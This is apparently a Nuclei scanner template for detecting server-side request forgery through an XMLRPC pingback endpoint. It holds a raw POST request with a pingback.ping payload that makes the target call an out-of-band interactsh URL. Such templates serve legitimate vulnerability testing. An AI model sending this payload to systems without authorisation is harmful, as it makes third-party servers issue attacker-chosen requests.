id: xmlrpc-pingback-ssrf
info:
  name: XMLRPC Pingback SSRF
  author: geeknik
  severity: high
  description: XMLRPC Pingback leads to SSRF.
  reference:
    - https://hackerone.com/reports/406387
  classification:
    cwe-id:
      - CWE-918
  metadata:
    runzero-review: REJECT/2025-11-07/uses interactsh
    max-request: 1
  tags: generic,hackerone,ssrf,vuln,xmlrpc
http:
  - matchers:
      - part: interactsh_protocol
        type: word
        words:
          - http
          # digest: 490a004630440220078c158831ae48f7483e90f2652096a665d9e57aef745a0643289032a0015d6a0220127422cad9d2cf0cf0aa443db46e13710bfdeea1f0ce8f0cd0798ab9502525e6:922c64590222798bb761d5b6d8e72950
    raw:
      - |
        POST /xmlrpc/pingback HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
        <param>
        <value>http://{{interactsh-url}}</value>
        </param>
        </params>
        </methodCall>
